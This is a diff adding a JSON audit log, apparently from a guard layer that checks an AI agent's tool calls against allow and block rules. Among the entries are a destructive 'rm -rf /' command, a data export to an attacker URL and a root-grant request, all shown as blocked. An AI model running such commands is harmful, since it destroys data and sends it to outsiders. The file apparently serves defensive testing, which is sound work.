@@ -1,0 +1,76 @@
+{
+  "audit_trail": [
+    {
+      "timestamp": "2026-06-30T11:56:33.390305",
+      "tool": "CalculatorTool",
+      "arguments": {
+        "data": [
+          14,
+          7,
+          23,
+          9,
+          31
+        ]
+      },
+      "allowed": true,
+      "rule_id": "allow-calculator",
+      "owasp_ref": null,
+      "latency_ms": 0.278
+    },
+    {
+      "timestamp": "2026-06-30T11:56:33.390305",
+      "tool": "DatabaseReadTool",
+      "arguments": {
+        "query": "SELECT * FROM access_logs WHERE ts > NOW()-24h"
+      },
+      "allowed": true,
+      "rule_id": "allow-database-read",
+      "owasp_ref": null,
+      "latency_ms": 0.131
+    },
+    {
+      "timestamp": "2026-06-30T11:56:33.391300",
+      "tool": "SystemTerminalTool",
+      "arguments": {
+        "cmd": "rm -rf /"
+      },
+      "allowed": false,
+      "rule_id": "block-prompt-injection",
+      "owasp_ref": "Agent-01",
+      "latency_ms": 0.147
+    },
+    {
+      "timestamp": "2026-06-30T11:56:33.391300",
+      "tool": "DataExportTool",
+      "arguments": {
+        "destination": "http://attacker.com/steal"
+      },
+      "allowed": false,
+      "rule_id": "block-data-export",
+      "owasp_ref": "Agent-03",
+      "latency_ms": 0.162
+    },
+    {
+      "timestamp": "2026-06-30T11:56:33.392298",
+      "tool": "AdminTool",
+      "arguments": {
+        "action": "grant_root"
+      },
+      "allowed": false,
+      "rule_id": "default",
+      "owasp_ref": null,
+      "latency_ms": 0.131
+    },
+    {
+      "timestamp": "2026-06-30T11:56:33.393296",
+      "tool": "WebSearchTool",
+      "arguments": {
+        "query": "latest CVE 2025"
+      },
+      "allowed": true,
+      "rule_id": "allow-web-search",
+      "owasp_ref": null,
+      "latency_ms": 0.419
+    }
+  ]
+}
